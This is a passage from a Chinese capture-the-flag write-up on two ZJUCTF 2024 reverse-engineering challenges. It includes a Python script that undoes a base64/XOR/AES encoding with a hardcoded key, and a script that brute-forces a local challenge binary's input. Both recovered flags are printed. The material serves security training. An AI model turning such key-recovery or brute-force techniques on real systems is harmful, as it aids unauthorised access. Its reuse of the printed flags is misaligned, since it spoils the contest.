    <span class="k">return</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">([</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">],</span> <span class="n">dtype</span><span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">encodeX</span><span class="p">(</span><span class="n">arg0</span><span class="p">,</span> <span class="n">arg1</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">arg0</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">arg1</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">arg1</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">res</span>

<span class="k">def</span><span class="w"> </span><span class="nf">encodeY</span><span class="p">(</span><span class="n">arg</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">arg</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

<span class="k">def</span><span class="w"> </span><span class="nf">decodeY</span><span class="p">(</span><span class="n">arg</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">decodeX</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
    <span class="n">arg0</span> <span class="o">=</span> <span class="n">res</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
    <span class="n">arg1</span> <span class="o">=</span> <span class="n">res</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="n">arg0</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">arg1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">arg0</span><span class="p">,</span> <span class="n">arg1</span>

<span class="n">commonCipherKey</span> <span class="o">=</span> <span class="n">string_to_uint8_array</span><span class="p">(</span><span class="s2">&quot;ZJUCTF2024-OHAPP&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">tobytes</span><span class="p">()</span>

<span class="n">code</span> <span class="o">=</span> <span class="s2">&quot;Uzzj0V3pAh3AlPJ150WajAyXXST9UrJOdAo6iGDSj1c=&quot;</span>

<span class="n">tmp4</span> <span class="o">=</span> <span class="n">code</span>

<span class="n">tmp3</span> <span class="o">=</span> <span class="n">decodeY</span><span class="p">(</span><span class="n">tmp4</span><span class="p">)</span>
<span class="n">tmp3</span> <span class="o">=</span> <span class="p">[</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">tmp3</span><span class="p">]</span>
<span class="c1"># print(tmp3)</span>

<span class="n">tmp1</span><span class="p">,</span> <span class="n">tmp2</span> <span class="o">=</span> <span class="n">decodeX</span><span class="p">(</span><span class="n">tmp3</span><span class="p">)</span>
<span class="n">tmp1</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">tmp1</span><span class="p">)</span>
<span class="n">tmp2</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">tmp2</span><span class="p">)</span>
<span class="c1"># print(tmp2)</span>
<span class="c1"># print(tmp1)</span>

<span class="n">cipherY</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">commonCipherKey</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="o">=</span><span class="n">tmp1</span><span class="p">)</span>
<span class="n">slice2</span> <span class="o">=</span> <span class="n">cipherY</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">tmp2</span><span class="p">)</span>
<span class="c1"># print(slice2)</span>

<span class="n">cipherX</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">commonCipherKey</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
<span class="n">slice1</span> <span class="o">=</span> <span class="n">cipherX</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">tmp1</span><span class="p">)</span>
<span class="c1"># print(slice1)</span>

<span class="n">flag</span> <span class="o">=</span> <span class="n">slice1</span> <span class="o">+</span> <span class="n">slice2</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ZJUCTF{&quot;</span> <span class="o">+</span> <span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&quot;}&quot;</span><span class="p">)</span>
</code></pre></div>
<p>得到 flag <code>ZJUCTF{_@_Ea5Y_ohaPp_@ND_a_5iMPl3_fl4g_}</code>。</p>
<h3 id="rukma">Rukma<a class="headerlink" href="#rukma" title="Permanent link">&para;</a></h3>
<!-- x-x-x-x-m-m-o-o-x-o-x-x -->
<p>看反编译代码，可以发现 flag 的形式为 <code>A-A-A-A-A-A-A-A-A-A-A-A</code> 其中 <code>A</code> 为 <code>x</code> 或 <code>m</code> 或 <code>o</code>。那么直接枚举爆破就行了。</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># pwntools is too slow!!!</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">tqdm</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">itertools</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="n">charset</span> <span class="o">=</span> <span class="s2">&quot;xmo&quot;</span>
<span class="n">length</span> <span class="o">=</span> <span class="mi">23</span> <span class="o">-</span> <span class="mi">11</span>
<span class="n">comb</span> <span class="o">=</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">charset</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="n">length</span><span class="p">)</span>
<span class="n">comb</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">comb</span><span class="p">)</span>
<span class="n">random</span><span class="o">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">comb</span><span class="p">)</span> <span class="c1"># maybe we can find the flag faster</span>

<span class="n">exe_path</span> <span class="o">=</span> <span class="s2">&quot;./chall&quot;</span>

<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="o">.</span><span class="n">tqdm</span><span class="p">(</span><span class="n">comb</span><span class="p">):</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span><span class="p">[:</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">:]</span>
    <span class="c1"># print(flag)</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span>
        <span class="n">exe_path</span><span class="p">,</span>
        <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
        <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
        <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
        <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
    <span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">flag</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
    <span class="n">stdout</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="c1"># print(stdout)</span>
    <span class="k">if</span> <span class="n">stdout</span> <span class="o">!=</span> <span class="s2">&quot;input: try again</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
        <span class="k">break</span>
    <span class="n">p</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
</code></pre></div>
<p>得到 flag <code>ZJUCTF{m-x-m-m-o-o-x-o-m-x-o-x}</code>。</p>







  
    
  
  
    
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="最后更新">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">2024年10月24日</span>
  </span>

    
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="创建日期">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">2024年10月23日</span>
  </span>

    
    
      
  
  <span class="md-source-file__fact">
    <span class="md-icon" title="贡献者">
      
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 4a4 4 0 0 1 4 4 4 4 0 0 1-4 4 4 4 0 0 1-4-4 4 4 0 0 1 4-4m0 10c4.42 0 8 1.79 8 4v2H4v-2c0-2.21 3.58-4 8-4"/></svg>
      
    </span>
    <nav>
      
        <a href="mailto:suyucheng5@gmail.com">GoPoux4</a>
    </nav>
  </span>

    
    
      
  <span class="md-source-file__fact">
    
      
  <span class="md-icon" title="贡献者">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12c0 4.42 2.87 8.17 6.84 9.5.5.08.66-.23.66-.5v-1.69c-2.77.6-3.36-1.34-3.36-1.34-.46-1.16-1.11-1.47-1.11-1.47-.91-.62.07-.6.07-.6 1 .07 1.53 1.03 1.53 1.03.87 1.52 2.34 1.07 2.91.83.09-.65.35-1.09.63-1.34-2.22-.25-4.55-1.11-4.55-4.92 0-1.11.38-2 1.03-2.71-.1-.25-.45-1.29.1-2.64 0 0 .84-.27 2.75 1.02.79-.22 1.65-.33 2.5-.33s1.71.11 2.5.33c1.91-1.29 2.75-1.02 2.75-1.02.55 1.35.2 2.39.1 2.64.65.71 1.03 1.6 1.03 2.71 0 3.82-2.34 4.66-4.57 4.91.36.31.69.92.69 1.85V21c0 .27.16.59.67.5C19.14 20.16 22 16.42 22 12A10 10 0 0 0 12 2"/></svg>
  </span>
  <span>GitHub</span>

    
    <nav>
      
        <a href="https://github.com/GoPoux4" class="md-author" title="@GoPoux4">
          
          <img src="https://avatars.githubusercontent.com/u/56778898?v=4&size=72" alt="GoPoux4">
        </a>
      
      
      
    </nav>
  </span>

    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  回到页面顶部
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="页脚" >
        
          
          <a href="../../../books/ostep/chapter1/process/" class="md-footer__link md-footer__link--prev" aria-label="上一页: CPU 虚拟化：进程">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                上一页
              </span>
              <div class="md-ellipsis">
                CPU 虚拟化：进程
              </div>
            </div>
          </a>
        
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright &copy; 2023-2024 GoPoux
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
    <a href="https://github.com/GoPoux4" target="_blank" rel="noopener" title="My Github Page" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
    
    
    
    
    <a href="https://www.cnblogs.com/syc233/" target="_blank" rel="noopener" title="My Cnblog Page" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M0 64c0-17.7 14.3-32 32-32 229.8 0 416 186.2 416 416 0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96 14.3 96 0 81.7 0 64m0 352a64 64 0 1 1 128 0 64 64 0 1 1-128 0m32-256c159.1 0 288 128.9 288 288 0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224-17.7 0-32-14.3-32-32s14.3-32 32-32"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.annotate", "navigation.tracking", "navigation.tabs", "navigation.path", "navigation.indexes", "navigation.top", "navigation.footer", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.c8b220af.min.js"></script>
      
        <script src="../../../javascripts/mathjax.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
    
  </body>
</html>